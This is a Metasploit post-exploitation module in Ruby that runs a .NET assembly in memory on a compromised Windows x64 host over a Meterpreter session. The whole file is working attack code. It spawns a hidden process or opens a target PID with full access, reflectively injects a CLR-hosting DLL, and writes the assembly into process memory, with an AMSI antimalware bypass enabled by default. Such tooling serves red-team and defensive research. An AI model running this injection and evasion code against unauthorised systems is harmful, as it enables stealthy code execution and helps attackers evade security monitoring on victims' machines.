##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Execute .net Assembly (x64 only)',
                      'Description' => '
                      This module execute a .net assembly in memory.
                      Refletctively load the dll that host CLR, than
                      copy in memory the assembly that will be executed.
					  Credits for Amsi bypass to Rastamouse (@_RastaMouse)
                      ',
                      'License' => MSF_LICENSE,
                      'Author' => 'b4rtik',
                      'Arch' => [ARCH_X64],
                      'Platform' => 'win',
                      'SessionTypes' => ['meterpreter'],
                      'Targets' => [
                        ['Windows x64 (<= 10)', { 'Arch' => ARCH_X64 }]
                      ],
                      'References' => [
                        ['URL', 'https://b4rtik.blogspot.com/2018/12/execute-assembly-via-meterpreter-session.html']
                      ],
                      'DefaultTarget' => 0))
    register_options(
      [
        OptString.new('ASSEMBLY', [true, 'Assembly file name']),
        OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory',
                                     ::File.join(Msf::Config.data_directory, 
                                                 'execute-assembly')]),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
		OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
        OptInt.new('PID', [false, 'Pid  to inject', 0]),
		OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
		OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
      ], self.class
    )
  end

  def run
    exe_path = gen_exe_path
    assembly_size = File.size(exe_path)
    client.response_timeout=20
    params_size = if datastore['ARGUMENTS'].nil?
                    0
                  else
                    datastore['ARGUMENTS'].length
                  end

    if assembly_size <= 1_024_000 && params_size <= 1_024
      execute_assembly(exe_path)
    else
      if assembly_size > 1_024_000
        print_bad("Assembly max size 1024k actual file size #{assembly_size}")
      end
      if params_size > 1023
        print_bad('Parameters max lenght 1024 actual parameters length' \
                  "#{params_size}")
      end
    end
  end

  def gen_exe_path
    exe_path = if datastore['ASSEMBLYPATH'] == '' ||
                  datastore['ASSEMBLYPATH'].nil?
                 ::File.join(Msf::Config.data_directory, 'execute-assembly',
                             datastore['ASSEMBLY'])
               else
                 ::File.join(datastore['ASSEMBLYPATH'], datastore['ASSEMBLY'])
               end
    exe_path = ::File.expand_path(exe_path)
    exe_path
  end

  def sanitize_process_name(process_name)
    out_process_name = if process_name.split(//).last(4).join.eql? '.exe'
                         process_name
                       else
                         process_name + '.exe' 
                       end
    out_process_name
  end

  def pid_exists(pid)
    return true
  end

  def launch_process
    process_name = sanitize_process_name(datastore['PROCESS'])
    print_status("Launching #{process_name} to host CLR...")
    process = client.sys.process.execute(process_name, nil,
                                                 'Channelized' => true,
                                                 'Hidden' => true)
    hprocess = client.sys.process.open(process.pid,
                                      PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} launched.")
    [process, hprocess]
  end

  def inject_hostclr_dll(process)
    print_status("Reflectively injecting the Host DLL into #{process.pid}..")

    library_path = ::File.join(Msf::Config.data_directory,
                               'post', 'execute-assembly',
							   'HostingCLRx64.dll')
    library_path = ::File.expand_path(library_path)

    print_status("Injecting Host into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def hook_process
    print_status('Warning: output unavailable')
    print_status("Hooking #{datastore['PID']} to host CLR...")
    hprocess = client.sys.process.open(datastore['PID'],
                                      PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} hooked.")
    [nil, hprocess]
  end

  def execute_assembly(exe_path)
    process, hprocess = if datastore['PID'] <= 0
                          launch_process
                        else
                          hook_process
                        end
    exploit_mem, offset = inject_hostclr_dll(hprocess)

    assembly_mem = copy_assembly(exe_path, hprocess)

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, assembly_mem)

    sleep(datastore['WAIT'])
    
    if datastore['PID'] <= 0
      read_output(process)
      print_good("Killing process #{hprocess.pid}")
      hprocess.kill(hprocess.pid)
    end

    print_good('Execution finished.')
  end

  def copy_assembly(exe_path, process)
    print_status("Host injected. Copy assembly into #{process.pid}...")
    assembly_mem = process.memory.allocate(1_025_024, PAGE_READWRITE)

    params = if datastore['AMSIBYPASS'] == true
               "\x01"
             else
               "\x02"
             end

    params += if datastore['ARGUMENTS'].nil?
               ''
             else
               datastore['ARGUMENTS']
             end
    params += ("\x00" * (1024 - params.length))

    process.memory.write(assembly_mem, params + File.read(exe_path))

    print_status('Assembly copied.')
    assembly_mem
  end

  def read_output(process)
    print_status('Start reading output')
    begin
      loop do 
        output = process.channel.read 
        output.split("\n").each { |x| print_good(x) }
        break if output.length == 0
      end
    rescue ::Exception => e
      #print_status("Error running assemply: #{e.class} #{e}")
    end

    print_status('End output.')
  end
end